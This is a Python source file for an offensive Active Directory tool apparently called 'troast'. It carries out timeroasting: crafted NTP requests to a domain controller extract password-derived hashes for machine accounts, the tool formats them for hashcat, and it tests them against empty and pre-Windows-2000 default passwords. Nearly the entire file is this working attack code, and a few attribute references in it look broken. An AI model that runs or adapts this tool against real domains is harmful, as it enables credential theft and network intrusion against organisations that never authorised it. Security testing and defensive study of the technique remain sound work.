from troast import __version__
from troast.logger import console, logger, init_logger, OBJ_EXTRA_FMT
from troast.lib.ldap import init_ldap_session
from troast.lib.machine_hunter import MachineHunter
from random import randint
from getpass import getpass
from datetime import datetime
from binascii import hexlify, unhexlify
from struct import pack, unpack
from typing import *
from select import select
from time import time
from socket import socket, AF_INET, SOCK_DGRAM

import hashlib, sys, time, ldap3
from collections import OrderedDict

# Static NTP query prefix using the MD5 authenticator. Append 4-byte RID and dummy checksum to create a full query.
NTP_PREFIX = unhexlify('db0011e9000000000001000000000000e1b8407debc7e50600000000000000000000000000000000e1b8428bffbfcd0a')

def get_pre2kpass(name):
    return name[:14].strip().lower().replace('$','')

def gen_dict(inputfile, outfile):
    init_logger(False)
    fin = inputfile.read().split("\n")
    with open(outfile, 'w') as fout:
        for line in fin:
            if not line: continue
            fout.write(get_pre2kpass(line) + '\n')
    logger.info("Dictionary with pre2k passwords generated")

class Troast:
    def __init__(self, mode, rate,
                 domain=None, username=None, password=None, hashes=None, aes=None,no_pass=False, kerberos=False, ldaps=False,
                 dc_ip=None,  inputfile=None, ridrange=None, outresults=None, outhashes=None, outlosted=None,
                 targeted=False, verbose=False, stop_on_success=False):
        
        self.mode  = mode
        self.rate  = rate
        self.dc_ip = self.domain if dc_ip is None else dc_ip
        
        self.domain   = domain 
        self.username = username
        self.password = password
        self.hashes   = hashes
        self.aes      = aes
        self.no_pass  = no_pass
        self.kerberos = kerberos
        self.ldaps    = ldaps
        
        self.targeted = targeted
        self.verbose  = verbose
        
        self.outresults = outresults
        self.outhashes  = outhashes
        self.outlosted  = outlosted

        self.stop_on_success = stop_on_success
        
        self.inputfile = inputfile
        self.ridrange  = ridrange
        
        
        self.foundhashes = 0
        self.rids    = {}
        self.tried   = 0
        self.valid   = 0
        self.lastrid = None
        
        self.keyflag = 0
        self.rids_received = set()


    def run(self):
        init_logger(self.verbose)
        if self.mode == 'file':
            self.parse_input()
        elif self.mode == 'range':
            self.get_ranges()
        elif self.mode == 'auth':
            self.get_machines()
        else:
            logger.error(f"Mode error")
        
        self.roasting()
        
        print()
        logger.info(f"Found passwords : {self.valid}")
        logger.info(f"Found hashes    : {self.foundhashes}")
        logger.info(f"Lost hashes     : {len(self.rids)-self.foundhashes}")
        logger.info(f"Last RID        : {self.lastrid}")
        logger.info(f"Total Time      : {str(datetime.now()-self.dt).split('.')[0]}")
        
        
        if self.outlosted:
            for rid in self.rids:
                if self.rids[rid].get('hash') is None:
                    line = str(rid)
                    if self.rids[rid].get('name'):
                        line += ':'+self.rids[rid].get('name')
                    self.printall(self.outlosted, line)
    
    
    def get_machines(self):
        lmhash = ""
        nthash = ""
        if self.hashes:
            lmhash, nthash = self.hashes.split(':')
        if not (self.password or self.hashes or self.aes or self.no_pass):
                self.password = getpass("Password:")
        
        try:
            ldap_server, ldap_session = init_ldap_session(domain=self.domain, username=self.username, password=self.password, lmhash=lmhash, nthash=nthash, kerberos=self.kerberos, domain_controller=self.dc_ip, aesKey=self.aes, hashes=self.hashes, ldaps=self.ldaps)
        except ldap3.core.exceptions.LDAPSocketOpenError as e:
            if 'invalid server address' in str(e):
                logger.error (f'Invalid server address - {self.domain}')
            else:
                logger.error ('Error connecting to LDAP server')
                print()
                logger.error(e)
            exit()
        except ldap3.core.exceptions.LDAPBindError as e:
            logger.error(f'Error: {str(e)}')
            exit()

        finder=MachineHunter(ldap_server, ldap_session, domain=self.domain, targeted=self.targeted)
        self.rids = finder.fetch_computers(ldap_session)


    def get_ranges(self):
        try:
            ranges = []
            for part in self.ridrange.split(','):
                if '-' in part:
                    [start, end] = part.split('-')
                    assert 0 <= int(start) < int(end) < 2**31
                    ranges.append(range(int(start), int(end) + 1))
                else:
                    assert 0 <= int(part) < 2**31
                    ranges.append([int(part)])
            self.rids = dict.fromkeys([x for l in ranges for x in l])
            for rid in self.rids:
                self.rids[rid] = {}
        except:
            logger.error(f"Error in range")


    def roasting(self):
        src_port = randint(0,1000)
        self.sock = socket(AF_INET, SOCK_DGRAM)
        try:
            self.sock.bind(('0.0.0.0', src_port ))
        except PermissionError:
            raise PermissionError(f'No permission to listen on port {src_port}. May need to run as root.')
        
        self.dt = datetime.now()
        logger.info(f"Testing started at {self.dt.strftime('%Y-%m-%d %H:%M:%S')}")
        print()
        with console.status(f"", spinner="dots") as status:
            for rid in OrderedDict(sorted(self.rids.items())):
                try:
                    self.roast(rid, status)
                except KeyboardInterrupt:
                    logger.info("Stopping session...")
                    sys.exit()
                            
    
    def hashcat_format(self, rid : int, hashval : bytes, salt : bytes) -> str:
        return f'$sntp-ms${hexlify(hashval).decode()}${hexlify(salt).decode()}'
    

    def compute_hash(self, password : str, salt : bytes) -> bytes:
        return hashlib.md5(hashlib.new('md4', password.encode('utf-16le')).digest() + salt).digest()


    def check(self, password:str, md5hash, salt):
        return False if password is None or self.compute_hash(password, salt) != md5hash else True
        

    def founder(self, rid, password, success):
        if not success:return
        self.valid += 1
        login = ''
        if self.rids.get(rid) and self.rids.get(rid).get('name'):
            login = self.rids[rid].get('name')
        
        if not password:
            line  = (f'[green bold][RID:{rid}][/] {login.lower()}:[red bold]no-pass[/]')
            line2 = (f'{rid}:{login.lower()}:no-pass')
        else:   
            line  = (f'[green bold][RID:{rid}][/] {login.lower()}:{password}')
            line2 = (f'{rid}:{login.lower()}:{password}')

        self.printall(self.outresults, line2)
        logger.info (line, extra=OBJ_EXTRA_FMT)


    def roast(self, rid:int, status):
        self.tried += 1
        query = NTP_PREFIX + pack('<I', rid ^ self.keyflag) + b'\x00' * 16
        self.sock.sendto(query, (self.dc_ip, 123))
        ready, [], [] = select([self.sock], [], [], 1 / self.rate)
        if ready:
            reply = self.sock.recvfrom(120)[0]
            if len(reply) == 68:
                salt = reply[:48]
                answer_rid = unpack('<I', reply[-20:-16])[0] ^ self.keyflag
                md5hash = reply[-16:]
                if answer_rid not in self.rids_received:
                    self.foundhashes += 1
                    self.lastrid = answer_rid
                    self.rids_received.add(answer_rid)
                    self.rids[answer_rid]['hash'] = self.hashcat_format(answer_rid, md5hash, salt)
                    self.printall(self.outhashes, self.rids[answer_rid]['hash'])
                    self.founder(answer_rid, '', self.check('', md5hash, salt))
                    if self.mode != 'range':
                        passw = get_pre2kpass(self.rids[answer_rid]['name'])
                        self.founder(answer_rid, passw, self.check(passw, md5hash, salt))

        status.update(f"Found passwords: {self.valid}. Found hashes: {self.foundhashes}. Last RID: {self.lastrid}. Tried RIDs: {self.tried}/{len(self.rids)}. ")


    def delay(self):
        if self.sleep and self.jitter:
            delay = self.sleep + (self.sleep * (randint(1, self.jitter) / 100))
            logger.debug (f'Sleeping {delay} seconds until next attempt.')
            time.sleep(delay)
        elif self.sleep and not self.jitter:
            logger.debug(f'Sleeping {self.sleep} seconds until next attempt.')
            time.sleep(self.sleep)


    def parse_input(self):
        fin = self.inputfile.read().split("\n")
        for line in fin:
            if not line: continue
            splist = line.split(':')
            self.rids[int(splist[0])] = {}
            self.rids[int(splist[0])]['name'] = splist[1] if len(splist) == 2 else None


    def printall(self, file, line):
        if file is None: return
        with open(file, 'a') as f:
            f.write("{}\n".format(line))
            f.close
